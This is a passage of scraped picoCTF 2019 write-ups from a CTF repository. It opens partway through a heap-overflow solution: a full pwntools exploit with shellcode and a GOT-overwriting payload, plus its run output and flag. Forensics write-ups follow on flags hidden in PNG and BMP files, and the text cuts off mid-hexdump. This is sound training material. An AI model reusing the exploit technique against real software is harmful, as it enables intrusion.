`nop` area, which will be destroyed, straight to the real shellcode which in our case just calls `win`.\r\n\r\nNow, when `puts` gets called, our shellcode is executed and we get the flag.\r\n\r\n\r\n```python\r\n# First, generate a pwntools template using:\r\n# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln\r\n\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     i386-32-little\r\n# RELRO:    Partial RELRO\r\n# Stack:    Canary found\r\n# NX:       NX disabled\r\n# PIE:      No PIE (0x8048000)\r\n# RWX:      Has RWX segments\r\n\r\nimport os\r\n\r\nif shell is not None:\r\n    shell.set_working_directory(os.path.dirname(remote_path))\r\n\r\nio = start()\r\n\r\nio.recvuntil(\"Oops! a new developer copy pasted and printed an address as a decimal...\\n\")\r\naddress = int(io.recvline())\r\n\r\nlog.info(\"Address of fullname: {}\".format(hex(address)))\r\nlog.info(\"Address of win(): {}\".format(hex(exe.symbols[\"win\"])))\r\n\r\nshellcode = asm('jmp l1; nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop; l1: push {}; ret;'.format(hex(exe.symbols[\"win\"])))\r\nlog.info(\"shellcode:\\n{}\".format(hexdump(shellcode)))\r\n\r\npayload = shellcode + ('B' * (664-len(shellcode))) + p32(100, sign = \"signed\") + p32(-4, sign = \"signed\") + p32(exe.got[\"puts\"] - 12) + p32(address)\r\nlog.info(\"payload:\\n{}\".format(hexdump(payload)))\r\n\r\nio.sendlineafter(\"Input fullname\", payload)\r\nio.sendlineafter(\"Input lastname\", \"a\")\r\n\r\nprint io.recvall()\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Heap_overflow# python exploit.py\r\n[*] '/media/sf_CTFs/pico/Heap_overflow/vuln'\r\n    Arch:     i386-32-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    Canary found\r\n    NX:       NX disabled\r\n    PIE:      No PIE (0x8048000)\r\n    RWX:      Has RWX segments\r\n[+] Connecting to 2019shell1.picoctf.com on port 22: Done\r\n[*] dvdalt@2019shell1.picoctf.com:\r\n    Distro    Ubuntu 18.04\r\n    OS:       linux\r\n    Arch:     amd64\r\n    Version:  4.15.0\r\n    ASLR:     Enabled\r\n[+] Opening new channel: 'pwd': Done\r\n[+] Receiving all data: Done (13B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/tmp/tmp.79dCV2wlSk'\r\n[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done\r\n[+] Receiving all data: Done (0B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166'\r\n[+] Starting remote process '/problems/heap-overflow_2_de0f6daa62288c9b3afb950888dc7166/vuln' on 2019shell1.picoctf.com:\r\n pid 3532938\r\n[*] Address of fullname: 0x99e9008\r\n[*] Address of win(): 0x8048936\r\n[*] shellcode:\r\n    00000000  eb 0c 90 90  90 90 90 90  90 90 90 90  90 90 68 36  │····│····│····│··h6│\r\n    00000010  89 04 08 c3                                         │····││\r\n    00000014\r\n[*] payload:\r\n    00000000  eb 0c 90 90  90 90 90 90  90 90 90 90  90 90 68 36  │····│····│····│··h6│\r\n    00000010  89 04 08 c3  42 42 42 42  42 42 42 42  42 42 42 42  │····│BBBB│BBBB│BBBB│\r\n    00000020  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│\r\n    *\r\n    00000290  42 42 42 42  42 42 42 42  64 00 00 00  fc ff ff ff  │BBBB│BBBB│d···│····│\r\n    000002a0  1c d0 04 08  08 90 9e 09                            │····│····││\r\n    000002a8\r\n[+] Receiving all data: Done (33B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3532938)\r\n\r\npicoCTF{a_s1mpl3_h3ap_5e4b54d4}\r\n```", "timestamp": "2025-10-21T13:36:26.371850"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Investigative_Reversing_0.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_0.md", "content": "# Investigative Reversing 0\r\nForensics, 300 points\r\n\r\n## Description:\r\n> We have recovered a binary and an image. See what you can make of it. There should be a flag somewhere.\r\n\r\n\r\n## Solution: \r\n\r\nWe receive a binary file and an image. Let's inspect the binary with Ghidra:\r\n\r\n```c\r\nvoid main(void)\r\n\r\n{\r\n  long lVar1;\r\n  FILE *__flag_stream;\r\n  FILE *__img_stream;\r\n  size_t sVar2;\r\n  long in_FS_OFFSET;\r\n  int i;\r\n  int j;\r\n  char flag [26];\r\n  \r\n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\r\n  __flag_stream = fopen(\"flag.txt\",\"r\");\r\n  __img_stream = fopen(\"mystery.png\",\"a\");\r\n  if (__flag_stream == (FILE *)0x0) {\r\n    puts(\"No flag found, please make sure this is run on the server\");\r\n  }\r\n  if (__img_stream == (FILE *)0x0) {\r\n    puts(\"mystery.png is missing, please run this on the server\");\r\n  }\r\n  sVar2 = fread(flag,26,1,__flag_stream);\r\n  if ((int)sVar2 < 1) {\r\n                    /* WARNING: Subroutine does not return */\r\n    exit(0);\r\n  }\r\n  puts(\"at insert\");\r\n  fputc((int)flag[0],__img_stream);\r\n  fputc((int)flag[1],__img_stream);\r\n  fputc((int)flag[2],__img_stream);\r\n  fputc((int)flag[3],__img_stream);\r\n  fputc((int)flag[4],__img_stream);\r\n  fputc((int)flag[5],__img_stream);\r\n  i = 6;\r\n  while (i < 0xf) {\r\n    fputc((int)(char)(flag[i] + '\\x05'),__img_stream);\r\n    i = i + 1;\r\n  }\r\n  fputc((int)(char)(flag[15] + -3),__img_stream);\r\n  j = 16;\r\n  while (j < 26) {\r\n    fputc((int)flag[j],__img_stream);\r\n    j = j + 1;\r\n  }\r\n  fclose(__img_stream);\r\n  fclose(__flag_stream);\r\n  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\r\n                    /* WARNING: Subroutine does not return */\r\n    __stack_chk_fail();\r\n  }\r\n  return;\r\n}\r\n```\r\n\r\nWe can see that the program opens the flag file, and places an encoded version of it at the end of the image file:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_0# xxd -g 1 mystery.png | tail\r\n0001e7f0: 82 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21  . .. .. .. d.2.!\r\n0001e800: 08 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82  .. .. .. .B.!#..\r\n0001e810: 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08   .. .. .. d.2.!.\r\n0001e820: 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20  . .. .. .B.!#..\r\n0001e830: 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08 82  .. .. .. d.2.!..\r\n0001e840: 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20 08   .. .. .B.!#.. .\r\n0001e850: 82 20 08 82 20 08 82 20 64 17 ff ef ff fd 7f 5e  . .. .. d......^\r\n0001e860: ed 5a 9d 38 d0 1f 56 00 00 00 00 49 45 4e 44 ae  .Z.8..V....IEND.\r\n0001e870: 42 60 82 70 69 63 6f 43 54 4b 80 6b 35 7a 73 69  B`.picoCTK.k5zsi\r\n0001e880: 64 36 71 5f 66 62 36 39 66 36 63 32 7d           d6q_fb69f6c2}\r\n```\r\n\r\nWe can easily reverse the logic with the following script:\r\n```python\r\nimport os\r\nimport mmap\r\n\r\ndef memory_map(filename, access=mmap.ACCESS_READ):\r\n    size = os.path.getsize(filename)\r\n    fd = os.open(filename, os.O_RDONLY)\r\n    return mmap.mmap(fd, size, access=access)\r\n\r\nwith memory_map(\"mystery.png\") as b:\r\n    flag = b[-26:]\r\n    for i in range(6):\r\n        print(chr(flag[i]), end='')\r\n    for i in range(6, 15):\r\n        print(chr(flag[i] - 5), end='')\r\n    print(chr(flag[15] + 3), end='')\r\n    for i in range(16, 26):\r\n        print(chr(flag[i]), end='')\r\n    print (\"\")\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_0# python3 solve.py\r\npicoCTF{f0und_1t_fb69f6c2}\r\n```", "timestamp": "2025-10-21T13:36:26.489229"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Investigative_Reversing_1.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_1.md", "content": "# Investigative Reversing 1\r\nForensics, 350 points\r\n\r\n## Description:\r\n> We have recovered a binary and a few images: image, image2, image3. See what you can make of it. There should be a flag somewhere.\r\n\r\n\r\n## Solution: \r\n\r\nThis is the follow-up for [Investigative Reversing 0](Investigative_Reversing_0.md).\r\n\r\nAgain, let's check the binary with Ghidra:\r\n```c\r\nvoid main(void)\r\n\r\n{\r\n  long lVar1;\r\n  FILE *flag_stream;\r\n  FILE *m1_stream;\r\n  FILE *m2_stream;\r\n  FILE *m3_stream;\r\n  long in_FS_OFFSET;\r\n  char local_6b;\r\n  int i;\r\n  int j;\r\n  int k;\r\n  char flag [6];\r\n  \r\n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\r\n  flag_stream = fopen(\"flag.txt\",\"r\");\r\n  m1_stream = fopen(\"mystery.png\",\"a\");\r\n  m2_stream = fopen(\"mystery2.png\",\"a\");\r\n  m3_stream = fopen(\"mystery3.png\",\"a\");\r\n  if (flag_stream == (FILE *)0x0) {\r\n    puts(\"No flag found, please make sure this is run on the server\");\r\n  }\r\n  if (m1_stream == (FILE *)0x0) {\r\n    puts(\"mystery.png is missing, please run this on the server\");\r\n  }\r\n  fread(flag,26,1,flag_stream);\r\n  fputc((int)flag[1],m3_stream);\r\n  fputc((int)(char)(flag[0] + '\\x15'),m2_stream);\r\n  fputc((int)flag[2],m3_stream);\r\n  local_6b = flag[3];\r\n  fputc((int)flag[5],m3_stream);\r\n  fputc((int)flag[4],m1_stream);\r\n  i = 6;\r\n  while (i < 10) {\r\n    local_6b = local_6b + '\\x01';\r\n    fputc((int)flag[i],m1_stream);\r\n    i = i + 1;\r\n  }\r\n  fputc((int)local_6b,m2_stream);\r\n  j = 10;\r\n  while (j < 0xf) {\r\n    fputc((int)flag[j],m3_stream);\r\n    j = j + 1;\r\n  }\r\n  k = 0xf;\r\n  while (k < 0x1a) {\r\n    fputc((int)flag[k],m1_stream);\r\n    k = k + 1;\r\n  }\r\n  fclose(m1_stream);\r\n  fclose(flag_stream);\r\n  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\r\n                    /* WARNING: Subroutine does not return */\r\n    __stack_chk_fail();\r\n  }\r\n  return;\r\n}\r\n```\r\n\r\nThe encoded flag is scattered among three files:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_1# xxd -g 1 mystery.png | tail\r\n0001e7f0: 82 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21  . .. .. .. d.2.!\r\n0001e800: 08 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82  .. .. .. .B.!#..\r\n0001e810: 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08   .. .. .. d.2.!.\r\n0001e820: 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20  . .. .. .B.!#..\r\n0001e830: 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08 82  .. .. .. d.2.!..\r\n0001e840: 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20 08   .. .. .B.!#.. .\r\n0001e850: 82 20 08 82 20 08 82 20 64 17 ff ef ff fd 7f 5e  . .. .. d......^\r\n0001e860: ed 5a 9d 38 d0 1f 56 00 00 00 00 49 45 4e 44 ae  .Z.8..V....IEND.\r\n0001e870: 42 60 82 43 46 7b 41 6e 31 5f 38 35 35 36 31 31  B`.CF{An1_855611\r\n0001e880: 64 33 7d                                         d3}\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_1# xxd -g 1 mystery2.png | tail\r\n0001e7e0: 21 08 82 20 08 82 20 08 82 20 08 42 f6 21 23 11  !.. .. .. .B.!#.\r\n0001e7f0: 82 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21  . .. .. .. d.2.!\r\n0001e800: 08 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82  .. .. .. .B.!#..\r\n0001e810: 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08   .. .. .. d.2.!.\r\n0001e820: 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20  . .. .. .B.!#..\r\n0001e830: 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08 82  .. .. .. d.2.!..\r\n0001e840: 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20 08   .. .. .B.!#.. .\r\n0001e850: 82 20 08 82 20 08 82 20 64 17 ff ef ff fd 7f 5e  . .. .. d......^\r\n0001e860: ed 5a 9d 38 d0 1f 56 00 00 00 00 49 45 4e 44 ae  .Z.8..V....IEND.\r\n0001e870: 42 60 82 85 73                                   B`..s\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_1# xxd -g 1 mystery3.png | tail\r\n0001e7e0: 21 08 82 20 08 82 20 08 82 20 08 42 f6 21 23 11  !.. .. .. .B.!#.\r\n0001e7f0: 82 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21  . .. .. .. d.2.!\r\n0001e800: 08 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82  .. .. .. .B.!#..\r\n0001e810: 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08   .. .. .. d.2.!.\r\n0001e820: 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20  . .. .. .B.!#..\r\n0001e830: 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08 82  .. .. .. d.2.!..\r\n0001e840: 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20 08   .. .. .B.!#.. .\r\n0001e850: 82 20 08 82 20 08 82 20 64 17 ff ef ff fd 7f 5e  . .. .. d......^\r\n0001e860: ed 5a 9d 38 d0 1f 56 00 00 00 00 49 45 4e 44 ae  .Z.8..V....IEND.\r\n0001e870: 42 60 82 69 63 54 30 74 68 61 5f                 B`.icT0tha_\r\n```\r\n\r\nWe can reassemble the flag using the following script:\r\n\r\n```python\r\nimport os\r\nimport mmap\r\n\r\ndef memory_map(filename, access=mmap.ACCESS_READ):\r\n    size = os.path.getsize(filename)\r\n    fd = os.open(filename, os.O_RDONLY)\r\n    return mmap.mmap(fd, size, access=access)\r\n\r\nclass Mystery(object):\r\n    PNG_CRC_LEN = 4\r\n    def __init__(self, file_name):\r\n        self.map = memory_map(file_name)\r\n        self.buffer = self.map[self.map.find(b\"IEND\") + len(b\"IEND\") + self.PNG_CRC_LEN:]\r\n        self.offset = 0\r\n\r\n    def read_byte(self):\r\n        b = self.buffer[self.offset]\r\n        self.offset += 1\r\n        return b\r\n\r\n    def __del__(self):\r\n        self.map.close()\r\n\r\nFLAG_LEN = 26\r\n\r\nflag = [0] * FLAG_LEN\r\nm1_stream = Mystery(\"mystery.png\")\r\nm2_stream = Mystery(\"mystery2.png\")\r\nm3_stream = Mystery(\"mystery3.png\")\r\n\r\nflag[1] = m3_stream.read_byte()\r\nflag[0] = m2_stream.read_byte() - 0x15\r\nflag[2] = m3_stream.read_byte()\r\nflag[5] = m3_stream.read_byte()\r\nflag[4] = m1_stream.read_byte()\r\nfor i in range(6, 10):\r\n    flag[i] = m1_stream.read_byte()\r\nflag[3] = m2_stream.read_byte() - (10 - 6)\r\nfor i in range(10, 15):\r\n    flag[i] = m3_stream.read_byte()\r\nfor i in range(15, 26):\r\n    flag[i] = m1_stream.read_byte()\r\n\r\nprint (\"\".join(chr(x) for x in flag))\r\n```\r\n\r\nThe script uses a memory map to map the contents of each file, so that it can search for the legitimate end of the PNG file (which is the location of `IEND` plus 4 more bytes for the `IEND` chunk CRC) and start reading the flag from there.\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_1# python3 solve.py\r\npicoCTF{An0tha_1_855611d3}\r\n```", "timestamp": "2025-10-21T13:36:26.594619"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Investigative_Reversing_2.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_2.md", "content": "# Investigative Reversing 2\r\nForensics, 350 points\r\n\r\n## Description:\r\n> We have recovered a binary and an image See what you can make of it. There should be a flag somewhere.\r\n\r\n\r\n## Solution: \r\n\r\nThis is the follow-up for [Investigative Reversing 1](Investigative_Reversing_1.md).\r\n\r\nAgain, let's check the binary with Ghidra:\r\n\r\n```c\r\nundefined8 main(void)\r\n{\r\n  long lVar1;\r\n  size_t sVar2;\r\n  ulong uVar3;\r\n  long in_FS_OFFSET;\r\n  byte b;\r\n  char new_val;\r\n  int bytes_read;\r\n  int i;\r\n  int j;\r\n  int k;\r\n  undefined4 local_6c;\r\n  int limit;\r\n  int flag_bytes_read;\r\n  FILE *flag_file;\r\n  FILE *original_file;\r\n  FILE *encoded_file;\r\n  char flag [50];\r\n  \r\n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\r\n  local_6c = 0;\r\n  flag_file = fopen(\"flag.txt\",\"r\");\r\n  original_file = fopen(\"original.bmp\",\"r\");\r\n  encoded_file = fopen(\"encoded.bmp\",\"a\");\r\n  if (flag_file == (FILE *)0x0) {\r\n    puts(\"No flag found, please make sure this is run on the server\");\r\n  }\r\n  if (original_file == (FILE *)0x0) {\r\n    puts(\"original.bmp is missing, please run this on the server\");\r\n  }\r\n  sVar2 = fread(&b,1,1,original_file);\r\n  bytes_read = (int)sVar2;\r\n  limit = 2000;\r\n  i = 0;\r\n  while (i < limit) {\r\n    fputc((int)(char)b,encoded_file);\r\n    sVar2 = fread(&b,1,1,original_file);\r\n    bytes_read = (int)sVar2;\r\n    i = i + 1;\r\n  }\r\n  sVar2 = fread(flag,50,1,flag_file);\r\n  flag_bytes_read = (int)sVar2;\r\n  if (flag_bytes_read < 1) {\r\n    puts(\"flag is not 50 chars\");\r\n                    /* WARNING: Subroutine does not return */\r\n    exit(0);\r\n  }\r\n  j = 0;\r\n  while (j < 50) {\r\n    k = 0;\r\n    while (k < 8) {\r\n      uVar3 = codedChar(k,flag[j] - 5,b);\r\n      new_val = (char)uVar3;\r\n      fputc((int)new_val,encoded_file);\r\n      fread(&b,1,1,original_file);\r\n      k = k + 1;\r\n    }\r\n    j = j + 1;\r\n  }\r\n  while (bytes_read == 1) {\r\n    fputc((int)(char)b,encoded_file);\r\n    sVar2 = fread(&b,1,1,original_file);\r\n    bytes_read = (int)sVar2;\r\n  }\r\n  fclose(encoded_file);\r\n  fclose(original_file);\r\n  fclose(flag_file);\r\n  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {\r\n    return 0;\r\n  }\r\n                    /* WARNING: Subroutine does not return */\r\n  __stack_chk_fail();\r\n}\r\n\r\nulong codedChar(int param_1,byte param_2,byte param_3)\r\n{\r\n  byte local_20;\r\n  \r\n  local_20 = param_2;\r\n  if (param_1 != 0) {\r\n    local_20 = (byte)((int)(char)param_2 >> ((byte)param_1 & 0x1f));\r\n  }\r\n  return (ulong)(param_3 & 0xfe | local_20 & 1);\r\n}\r\n```\r\n\r\nThis time the program jumps to offset 2000, and hides the flag using LSB encoding.\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_2# xxd -g 1 -s $((2000 - 32)) -l $((50*8 + 64)) encoded.bmp\r\n000007b0: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n000007c0: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n000007d0: e9 e9 e8 e9 e8 e9 e9 e8 e8 e8 e9 e8 e8 e9 e9 e8  ................\r\n000007e0: e8 e9 e9 e9 e9 e8 e9 e8 e8 e9 e8 e9 e8 e9 e9 e8  ................\r\n000007f0: e8 e9 e9 e9 e9 e9 e8 e8 e9 e9 e9 e9 e8 e8 e9 e8  ................\r\n00000800: e9 e8 4e 4e 4e 4e 4f e8 e8 e9 e9 e8 e9 e9 e9 e8  ..NNNNO.........\r\n00000810: e9 e8 e8 e9 e8 e9 e9 e8 e8 e9 e9 e9 e8 e9 e8 e8  ................\r\n00000820: e9 e9 e8 e8 e9 e9 e9 e8 e9 e9 e9 e9 e8 e9 e9 e8  ................\r\n00000830: e8 e9 e8 e9 e9 e8 e9 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000840: e9 e8 e8 e9 e8 e9 e9 e8 e8 e9 e9 e9 e8 e9 e8 e8  ................\r\n00000850: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000860: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000870: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000880: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000890: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n000008a0: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n000008b0: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n000008c0: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n000008d0: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n000008e0: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n000008f0: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000900: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000910: e9 e9 e8 e9 e8 e9 e8 e8 e9 e9 e8 e9 e8 e9 e8 e8  ................\r\n00000920: e8 e8 e8 e8 e8 e9 e9 e8 e8 e9 e9 e9 e8 e9 e8 e8  ................\r\n00000930: e9 e9 e8 e9 e8 e9 e8 e8 e8 e9 e8 e8 e9 e9 e8 e8  ................\r\n00000940: e9 e8 e9 e9 e9 e8 e9 e8 e9 e8 e9 e9 e8 e9 e8 e8  ................\r\n00000950: e9 e8 e8 e8 e9 e9 e8 e8 e8 e8 e8 e9 e9 e9 e9 e8  ................\r\n00000960: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n00000970: e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8 e8  ................\r\n```\r\n\r\nWe can see that up to offset 2000 (0x7d0) we have a constant value of `0xe8`. Then, for 50 * 8 bytes we have different values, and finally, at offset `0x960` we're back to `0xe8`.\r\n\r\nLet's undo the logic with the following script:\r\n\r\n```python\r\nfrom pwn import *\r\n\r\nwith open(\"encoded.bmp\", \"rb\") as b:\r\n    b.seek(2000)\r\n    bin_str = \"\"\r\n    for j in range(50 * 8):\r\n        bin_str += str(ord(b.read(1)) & 1)\r\n\r\nchar_str = unbits(bin_str, endian = 'little')\r\nprint \"\".join(map(lambda c: chr(ord(c) + 5), char_str))\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_2# python solve.py\r\npicoCTF{n3xt_0n300000000000000000000000000e307b26}\r\n```", "timestamp": "2025-10-21T13:36:26.701742"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Investigative_Reversing_3.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_3.md", "content": "# Investigative Reversing 3\r\nForensics, 400 points\r\n\r\n## Description:\r\n> We have recovered a binary and an image See what you can make of it. There should be a flag somewhere.\r\n\r\n\r\n## Solution: \r\n\r\n\r\nThis is the follow-up for [Investigative Reversing 2](Investigative_Reversing_2.md).\r\n\r\nAgain, let's check the binary with Ghidra:\r\n\r\n```c\r\nundefined8 main(void)\r\n{\r\n  long lVar1;\r\n  size_t sVar2;\r\n  ulong uVar3;\r\n  long in_FS_OFFSET;\r\n  byte b;\r\n  char local_7d;\r\n  int bytes_read;\r\n  int i;\r\n  uint j;\r\n  int k;\r\n  undefined4 local_6c;\r\n  int limit;\r\n  int bytes_read_from_flag;\r\n  FILE *flag_file;\r\n  FILE *original_file;\r\n  FILE *encoded_file;\r\n  byte flag [50];\r\n  \r\n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\r\n  local_6c = 0;\r\n  flag_file = fopen(\"flag.txt\",\"r\");\r\n  original_file = fopen(\"original.bmp\",\"r\");\r\n  encoded_file = fopen(\"encoded.bmp\",\"a\");\r\n  if (flag_file == (FILE *)0x0) {\r\n    puts(\"No flag found, please make sure this is run on the server\");\r\n  }\r\n  if (original_file == (FILE *)0x0) {\r\n    puts(\"No output found, please run this on the server\");\r\n  }\r\n  sVar2 = fread(&b,1,1,original_file);\r\n  bytes_read = (int)sVar2;\r\n  limit = 0x2d3;\r\n  i = 0;\r\n  while (i < limit) {\r\n    fputc((int)(char)b,encoded_file);\r\n    sVar2 = fread(&b,1,1,original_file);\r\n    bytes_read = (int)sVar2;\r\n    i = i + 1;\r\n  }\r\n  sVar2 = fread(flag,50,1,flag_file);\r\n  bytes_read_from_flag = (int)sVar2;\r\n  if (bytes_read_from_flag < 1) {\r\n    puts(\"Invalid Flag\");\r\n                    /* WARNING: Subroutine does not return */\r\n    exit(0);\r\n  }\r\n  j = 0;\r\n  while ((int)j < 100) {\r\n    if ((j & 1) == 0) {\r\n      k = 0;\r\n      while (k < 8) {\r\n        uVar3 = codedChar(k,flag[(int)j / 2],b);\r\n        local_7d = (char)uVar3;\r\n        fputc((int)local_7d,encoded_file);\r\n        fread(&b,1,1,original_file);\r\n        k = k + 1;\r\n      }\r\n    }\r\n    else {\r\n      fputc((int)(char)b,encoded_file);\r\n      fread(&b,1,1,original_file);\r\n    }\r\n    j = j + 1;\r\n  }\r\n  while (bytes_read == 1) {\r\n    fputc((int)(char)b,encoded_file);\r\n    sVar2 = fread(&b,1,1,original_file);\r\n    bytes_read = (int)sVar2;\r\n  }\r\n  fclose(encoded_file);\r\n  fclose(original_file);\r\n  fclose(flag_file);\r\n  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {\r\n    return 0;\r\n  }\r\n                    /* WARNING: Subroutine does not return */\r\n  __stack_chk_fail();\r\n}\r\n\r\nulong codedChar(int param_1,byte param_2,byte param_3)\r\n{\r\n  byte local_20;\r\n  \r\n  local_20 = param_2;\r\n  if (param_1 != 0) {\r\n    local_20 = (byte)((int)(char)param_2 >> ((byte)param_1 & 0x1f));\r\n  }\r\n  return (ulong)(param_3 & 0xfe | local_20 & 1);\r\n}\r\n```\r\n\r\nWe see that the flag is encoded using LSB encoding, in a similar manner to the previous challenge. This time, the encoding starts from offset 0x2d3. 8 bits of payload are encoded in the LSB of 8 bytes of the image, and then one byte of the original image is placed as-is.\r\n\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Investigative_Reversing_3# xxd -g 1 -s $((0x2d3 - 32)) -l $((50*8 + 48 + 64)) encoded.bmp\r\n000002b3: 60 e0 00 80 80 00 00 80 80 20 00 80 80 40 00 80  `........ ...@..\r\n000002c3: 80 60 00 80 80 80 00 80 80 a0 00 80 80 c0 00 80  .`..............\r\n000002d3: 80 e0 00 80 a1 01 01 80 a0 21 00 80 a1 40 01 81  .........!...@..\r\n000002e3: a0 60 01 81 a0 80 00 81 a1 a0 00 81 a1 c1 01 80  .`..............\r\n000002f3: a1 e1 00 80 c1 01 00 80 c0 20 01 80 c0 40 00 81  ......... ...@..\r\n00000303: c0 61 00 81 c0 80 00 81 c1 a0 00 80 c1 c0 00 81  .a..............\r\n00000313: c1 e0 01 81 e1 01 00 80 e0 20 01 80 e1 41 00 80  ......... ...A..\r\n00000323: e0 60 01 81 e1 80 01 81 e0 a0 00 80 e0 c0 01 81  .`..............\r\n00000333: e0 e0 00 c0 00 01 00 c1 01 21 00 c0 00 40 00 c1  .........!...@..\r\n00000343: 00 61 01 c0 00 81 01 c0 00 a1 01 c0 00 c0 00 c1  .a..............\r\n00000353: 00 e0 01 c1 21 00 00 c1 21 21 01 c1 20 41 00 c0  ....!...!!.. A..\r\n00000363: 20 60 01 c1 20 80 01 c0 20 a1 00 c1 20 c1 01 c0   `.. ... ... ...\r\n00000373: 20 e0 00 c1 40 00 00 c1 41 20 00 c1 41 41 01 c1   ...@...A ..AA..\r\n00000383: 40 61 00 c0 40 80 00 c0 41 a1 01 c0 40 c0 01 c0  @a..@...A...@...\r\n00000393: 40 e1 01 c1 60 00 00 c0 60 20 01 c1 60 40 00 c0  @...`...` ..`@..\r\n000003a3: 61 60 00 c0 61 81 00 c0 60 a0 01 c1 60 c1 01 c0  a`..a...`...`...\r\n000003b3: 60 e1 01 c0 80 01 01 c0 80 20 01 c0 81 41 00 c1  `........ ...A..\r\n000003c3: 81 60 00 c1 81 81 01 c1 80 a1 00 c0 80 c0 00 c0  .`..............\r\n000003d3: 81 e1 00 c0 a0 00 00 c0 a0 21 01 c0 a0 40 00 c0  .........!...@..\r\n000003e3: a0 60 01 c1 a0 80 00 c0 a0 a0 00 c1 a1 c0 00 c0  .`..............\r\n000003f3: 